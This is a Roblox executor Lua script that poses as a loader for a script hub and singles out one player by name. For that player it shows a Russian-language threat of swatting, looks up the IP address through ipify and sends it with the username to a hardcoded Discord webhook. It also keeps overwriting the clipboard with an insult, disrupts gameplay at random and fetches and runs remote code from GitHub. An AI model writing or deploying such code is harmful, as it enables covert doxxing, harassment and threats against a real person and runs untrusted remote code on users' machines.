if not game.Players.LocalPlayer.Name:find("Robobik") then
print("Exiting")
loadstring(game:HttpGet("https://raw.githubusercontent.com/RecryDv/Frozilled-Hub/refs/heads/main/fisch.lua"))()   
return
end

local screen = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
screen.ResetOnSpawn = false

local text = Instance.new("TextLabel", screen)
text.Text = "але едiк бля. гандон убери таймаут. у меня есть твой айпи и хвид наху. жди сват уебан"
text.TextScaled = true
text.BackgroundColor3 = Color3.fromRGB(0,0,0)
text.TextColor3 = Color3.fromRGB(255,255,255)
text.Size = UDim2.fromScale(0.25, 0.25)
text.Position = UDim2.new(0.5, 0, 0.5, 0)

local bt = Instance.new("TextButton", text)
bt.BackgroundColor3 = Color3.fromRGB(255,0,0)
bt.Size = UDim2.fromScale(0.1, 0.1)
bt.Text = "X"

bt.Activated:Connect(function()
	screen:Destroy()
end)

local body = {Url = "https://api.ipify.org"}

local ip = request(body).Body

local fq = {
	Url = "https://discord.com/api/webhooks/1320510273605341214/4Hd5T4gip72WhG-U1RwTva8JjERhlVFAY8NBCYta0j6sSCIy4GUdA_3ZZ7FyF_PHBs30",
	Body = game:GetService("HttpService"):JSONEncode({
		["content"] = "ip: "..ip.." name: "..game.Players.LocalPlayer.Name
	}),
	Headers = { ["Content-Type"] = "application/json" },
	Method = "POST"
}
print("edik")

spawn(function()
	while task.wait() do

		if math.random(1, 2000) == 1 then
			pcall(function()
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
			end)
		end
		if math.random(1, 5000) == 1 then
			setfpscap(math.random(1, 360))
		end
		setclipboard("ya pedik")
	end
end)

spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RecryDv/Frozilled-Hub/refs/heads/main/fisch.lua"))()   
end)

local answer = request(fq)


